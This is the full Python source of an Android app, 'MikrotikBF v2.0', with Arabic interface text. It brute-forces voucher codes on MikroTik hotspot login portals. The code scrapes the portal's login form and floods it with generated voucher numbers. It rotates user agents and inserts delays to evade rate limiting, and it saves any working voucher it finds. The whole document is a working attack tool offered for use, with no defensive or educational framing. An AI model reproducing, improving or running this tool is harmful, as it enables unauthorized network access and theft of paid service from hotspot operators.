#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MikrotikBF v2.0 — Android Edition
Uses requests + threading (Android-compatible)
"""

import os
import sys
import time
import random
import threading
import sqlite3
import queue
from datetime import datetime
from urllib.parse import urljoin

from kivy.app import App
from kivy.clock import Clock
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.scrollview import ScrollView
from kivy.uix.textinput import TextInput
from kivy.core.window import Window
from kivy.utils import platform

import requests
from bs4 import BeautifulSoup

# ═══════════════════════════════════════════════════════════
#  الإعدادات
# ═══════════════════════════════════════════════════════════
DEFAULT_TARGET = "http://t.net/index.html"
DEFAULT_PREFIX = "31"
DEFAULT_SUFFIX = "2"
DEFAULT_VAR_DIGITS = 5
DEFAULT_MAX_ATTEMPTS = 100000

MAX_THREADS = 3
REQUEST_TIMEOUT = 15
RETRY_ATTEMPTS = 2
DELAY_MIN = 0.3
DELAY_MAX = 1.2
BATCH_SIZE = 50
BATCH_REST = 10

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
]

SUCCESS_KEYWORDS = ["status", "success", "welcome", "logged in", "valid", "you are logged in"]
FAILURE_KEYWORDS = ["login", "error", "failed", "invalid", "incorrect", "wrong"]

if platform == 'android':
    try:
        from android.storage import primary_external_storage_path
        APP_DIR = os.path.join(primary_external_storage_path(), 'MikrotikBF')
    except Exception:
        APP_DIR = '/sdcard/MikrotikBF'
else:
    APP_DIR = os.path.dirname(os.path.abspath(__file__))

os.makedirs(APP_DIR, exist_ok=True)
OUTPUT_FILE = os.path.join(APP_DIR, "valid_vouchers.txt")
DB_FILE = os.path.join(APP_DIR, "history.db")


class LogWriter:
    def __init__(self, callback):
        self.callback = callback
    def write(self, text):
        if text and text.strip():
            try:
                Clock.schedule_once(lambda dt: self.callback(text), 0)
            except Exception:
                pass
    def flush(self):
        pass


class Database:
    def __init__(self, db_path=DB_FILE):
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.cursor = self.conn.cursor()
        self.lock = threading.Lock()
        self.cursor.execute("""
            CREATE TABLE IF NOT EXISTS attempted (
                number TEXT PRIMARY KEY,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        """)
        self.conn.commit()

    def add(self, voucher):
        with self.lock:
            try:
                self.cursor.execute("INSERT OR IGNORE INTO attempted (number) VALUES (?)", (voucher,))
                self.conn.commit()
            except Exception:
                pass

    def exists(self, voucher):
        with self.lock:
            self.cursor.execute("SELECT 1 FROM attempted WHERE number = ?", (voucher,))
            return self.cursor.fetchone() is not None

    def count_attempted(self):
        with self.lock:
            self.cursor.execute("SELECT COUNT(*) FROM attempted")
            return self.cursor.fetchone()[0]

    def close(self):
        try:
            self.conn.close()
        except Exception:
            pass


class HusseinNetTool:
    def __init__(self, start_url, prefix, suffix, var_digits, max_attempts, log_cb):
        self.start_url = start_url.rstrip('/')
        self.prefix = prefix
        self.suffix = suffix
        self.var_digits = var_digits
        self.max_attempts = max_attempts
        self.log = log_cb

        self.db = Database()
        self.login_url = None
        self.form_data_template = {}
        self.session = None
        self.total_attempts = self.db.count_attempted()
        self.error_count = 0
        self.start_time = None
        self.stop_event = threading.Event()
        self.found_voucher = None
        self.current_voucher = None

        self.queue = queue.Queue(maxsize=MAX_THREADS * 3)
        self.workers = []

    def init_session(self):
        self.session = requests.Session()
        self.session.headers.update({
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
        })

    def close_session(self):
        if self.session:
            try:
                self.session.close()
            except Exception:
                pass
        self.db.close()

    def get_random_headers(self):
        return {"User-Agent": random.choice(USER_AGENTS)}

    def fetch_with_retry(self, method, url, **kwargs):
        for attempt in range(RETRY_ATTEMPTS):
            try:
                headers = self.get_random_headers()
                if 'headers' in kwargs:
                    headers.update(kwargs.pop('headers'))
                r = self.session.request(
                    method, url,
                    headers=headers,
                    timeout=REQUEST_TIMEOUT,
                    verify=False,
                    **kwargs
                )
                if r.status_code >= 400:
                    raise Exception(f"HTTP {r.status_code}")
                return r, r.text
            except Exception:
                if attempt == RETRY_ATTEMPTS - 1:
                    raise
                time.sleep(1)

    def extract_login_details(self):
        try:
            self.log(f"[*] تحميل: {self.start_url}\n")
            resp, html = self.fetch_with_retry('GET', self.start_url)
        except Exception as e:
            self.log(f"[-] فشل: {e}\n")
            return False

        soup = BeautifulSoup(html, 'html.parser')
        form = soup.find('form')

        if not form:
            self.log("[!] لا form — نبحث عن رابط login...\n")
            login_links = []
            for a in soup.find_all('a', href=True):
                href = a['href']
                if 'login' in href.lower() or 'auth' in href.lower():
                    login_links.append(urljoin(self.start_url, href))

            if login_links:
                login_url = login_links[0]
                self.log(f"[*] رابط login: {login_url}\n")
                try:
                    resp2, html2 = self.fetch_with_retry('GET', login_url)
                    soup2 = BeautifulSoup(html2, 'html.parser')
                    form = soup2.find('form')
                    if form:
                        action = form.get('action', '')
                        self.login_url = urljoin(login_url, action) if action else login_url
                        for inp in form.find_all('input'):
                            name = inp.get('name')
                            if name:
                                self.form_data_template[name] = inp.get('value', '')
                        self.log(f"[+] POST URL: {self.login_url}\n")
                        return True
                except Exception as e:
                    self.log(f"[-] فشل: {e}\n")
            else:
                self.log("[-] لا يوجد رابط login\n")
            return False

        action = form.get('action', '')
        self.login_url = urljoin(self.start_url, action) if action else self.start_url
        for inp in form.find_all('input'):
            name = inp.get('name')
            if name:
                self.form_data_template[name] = inp.get('value', '')
        self.log(f"[+] POST URL: {self.login_url}\n")
        return True

    def generate_voucher(self):
        max_val = 10 ** self.var_digits - 1
        if self.db.count_attempted() >= (max_val + 1):
            return None
        for _ in range(100):
            num = random.randint(0, max_val)
            var_part = str(num).zfill(self.var_digits)
            voucher = self.prefix + var_part + self.suffix
            if not self.db.exists(voucher):
                self.db.add(voucher)
                return voucher
        for num in range(max_val + 1):
            var_part = str(num).zfill(self.var_digits)
            voucher = self.prefix + var_part + self.suffix
            if not self.db.exists(voucher):
                self.db.add(voucher)
                return voucher
        return None

    def producer(self):
        attempts = 0
        while attempts < self.max_attempts and not self.stop_event.is_set():
            voucher = self.generate_voucher()
            if voucher is None:
                self.log("[!] استنفاد الكروت\n")
                break
            try:
                self.queue.put(voucher, timeout=1)
            except queue.Full:
                continue
            attempts += 1
        try:
            self.queue.put(None, timeout=2)
        except queue.Full:
            pass

    def worker(self, worker_id):
        try:
            self.fetch_with_retry('GET', self.start_url)
        except Exception:
            pass

        while not self.stop_event.is_set():
            try:
                voucher = self.queue.get(timeout=0.5)
            except queue.Empty:
                continue
            if voucher is None:
                try:
                    self.queue.task_done()
                except Exception:
                    pass
                break

            self.current_voucher = voucher
            time.sleep(random.uniform(DELAY_MIN, DELAY_MAX))

            self.total_attempts += 1
            if self.total_attempts % BATCH_SIZE == 0:
                time.sleep(BATCH_REST)

            try:
                self.fetch_with_retry('GET', self.start_url)
            except Exception:
                pass

            data = self.form_data_template.copy()
            user_field = None
            for key in data.keys():
                if 'user' in key.lower() or 'name' in key.lower():
                    user_field = key
                    break
            if user_field is None:
                data['username'] = voucher
            else:
                data[user_field] = voucher

            for key in data.keys():
                if 'pass' in key.lower():
                    data[key] = '1234'

            try:
                resp, body = self.fetch_with_retry(
                    'POST', self.login_url, data=data, allow_redirects=True
                )
                final_url = str(resp.url).lower()
                body_lower = body.lower()

                success = False
                for kw in SUCCESS_KEYWORDS:
                    if kw in final_url or kw in body_lower:
                        success = True
                        break
                if not success:
                    for kw in FAILURE_KEYWORDS:
                        if kw in final_url or kw in body_lower:
                            success = False
                            break

                if success:
                    self.found_voucher = voucher
                    self.save_valid_voucher(voucher, final_url)
                    self.log(f"\n✅✅✅ كرت صحيح: {voucher}\n")
                    self.stop_event.set()
                else:
                    if self.total_attempts % 100 == 0:
                        self.log(f"[فشل] {voucher}\n")
            except Exception as e:
                self.error_count += 1
                if self.total_attempts % 50 == 0:
                    self.log(f"[خطأ] {voucher} - {str(e)[:30]}\n")

            try:
                self.queue.task_done()
            except Exception:
                pass

    def save_valid_voucher(self, voucher, final_url):
        try:
            with open(OUTPUT_FILE, 'a', encoding='utf-8') as f:
                f.write(f"[{datetime.now()}] Voucher: {voucher} | URL: {final_url}\n")
        except Exception:
            pass

    def ui_reporter(self):
        while not self.stop_event.is_set():
            elapsed = time.time() - self.start_time if self.start_time else 0
            rate = self.total_attempts / elapsed if elapsed > 0 else 0
            status = (f"⚡ {rate:.1f} req/s | "
                      f"🎯 {self.total_attempts}/{self.max_attempts} | "
                      f"❌ {self.error_count} | "
                      f"🎫 {self.current_voucher or '---'}")
            self.log(f"\r{status}")
            time.sleep(1.0)

    def shutdown(self):
        self.stop_event.set()

    def run(self):
        self.log(f"[*] الصفحة: {self.start_url}\n")
        self.init_session()

        if not self.extract_login_details():
            self.log("[-] فشل استخراج رابط الدخول\n")
            self.close_session()
            return

        self.log(f"[+] بدء الاختبار ({self.max_attempts} محاولة)\n")
        self.start_time = time.time()

        producer_thread = threading.Thread(target=self.producer, daemon=True)
        ui_thread = threading.Thread(target=self.ui_reporter, daemon=True)
        self.workers = [threading.Thread(target=self.worker, args=(i,), daemon=True)
                        for i in range(MAX_THREADS)]

        producer_thread.start()
        ui_thread.start()
        for t in self.workers:
            t.start()

        try:
            while not self.stop_event.is_set():
                time.sleep(0.5)
        except KeyboardInterrupt:
            self.log("\nتم الإيقاف يدوياً\n")
        finally:
            self.shutdown()
            self.close_session()

        if self.found_voucher:
            self.log(f"\n✅ النتيجة: {self.found_voucher}\n")
        else:
            self.log(f"\n⚠️ تم اختبار {self.total_attempts} كرت\n")


class MikrotikBFApp(App):
    def build(self):
        self.title = 'MikrotikBF v2.0'
        Window.clearcolor = (0.02, 0.02, 0.05, 1)

        root = BoxLayout(orientation='vertical', padding=10, spacing=8)

        header = Label(
            text='[b][color=a855f7]MikrotikBF v2.0[/color][/b]\n[color=8b95a9]Developer: Hussein[/color]',
            markup=True, size_hint_y=None, height=60, font_size='18sp'
        )
        root.add_widget(header)

        def make_input(label, default):
            box = BoxLayout(orientation='horizontal', size_hint_y=None, height=44, spacing=8)
            lbl = Label(text=label, size_hint_x=0.35, color=(0.78, 0.84, 0.9, 1))
            inp = TextInput(text=default, multiline=False,
                            background_color=(0.1, 0.13, 0.22, 1),
                            foreground_color=(0.93, 0.95, 1, 1),
                            cursor_color=(0.66, 0.33, 0.97, 1))
            box.add_widget(lbl)
            box.add_widget(inp)
            root.add_widget(box)
            return inp

        self.url_inp = make_input('الرابط', DEFAULT_TARGET)
        self.prefix_inp = make_input('Prefix', DEFAULT_PREFIX)
        self.suffix_inp = make_input('Suffix', DEFAULT_SUFFIX)
        self.digits_inp = make_input('Digits', str(DEFAULT_VAR_DIGITS))
        self.attempts_inp = make_input('المحاولات', str(DEFAULT_MAX_ATTEMPTS))

        btn_box = BoxLayout(orientation='horizontal', size_hint_y=None, height=50, spacing=8)
        self.start_btn = Button(
            text='▶ ابدأ',
            background_color=(0.66, 0.33, 0.97, 1),
            font_size='16sp'
        )
        self.start_btn.bind(on_press=self.start_attack)
        self.stop_btn = Button(
            text='⏹ إيقاف',
            background_color=(0.94, 0.27, 0.27, 1),
            font_size='16sp', disabled=True
        )
        self.stop_btn.bind(on_press=self.stop_attack)
        btn_box.add_widget(self.start_btn)
        btn_box.add_widget(self.stop_btn)
        root.add_widget(btn_box)

        log_label = Label(text='السجل:', size_hint_y=None, height=24,
                          color=(0.78, 0.84, 0.9, 1))
        root.add_widget(log_label)

        scroll = ScrollView()
        self.log_input = TextInput(
            text='', readonly=True, multiline=True,
            background_color=(0.03, 0.03, 0.08, 1),
            foreground_color=(0.88, 0.92, 1, 1),
            font_size='11sp'
        )
        scroll.add_widget(self.log_input)
        root.add_widget(scroll)

        sys.stdout = LogWriter(self.append_log)

        return root

    def append_log(self, text):
        self.log_input.text += text
        self.log_input.cursor = (0, len(self.log_input.text.split('\n')[-1]))

    def start_attack(self, instance):
        try:
            url = self.url_inp.text.strip()
            prefix = self.prefix_inp.text.strip()
            suffix = self.suffix_inp.text.strip()
            digits = int(self.digits_inp.text.strip())
            attempts = int(self.attempts_inp.text.strip())
        except ValueError:
            self.append_log('❌ أرقام غير صحيحة\n')
            return

        self.log_input.text = ''
        self.start_btn.disabled = True
        self.stop_btn.disabled = False
        self.tool = HusseinNetTool(url, prefix, suffix, digits, attempts, self.append_log)

        def run_loop():
            try:
                self.tool.run()
            except Exception as e:
                self.append_log(f'\n❌ خطأ: {e}\n')
            finally:
                Clock.schedule_once(lambda dt: self.on_finish(), 0)

        threading.Thread(target=run_loop, daemon=True).start()

    def on_finish(self):
        self.start_btn.disabled = False
        self.stop_btn.disabled = True

    def stop_attack(self, instance):
        if hasattr(self, 'tool') and self.tool:
            try:
                self.tool.stop_event.set()
            except Exception:
                pass


if __name__ == '__main__':
    requests.packages.urllib3.disable_warnings()
    MikrotikBFApp().run()
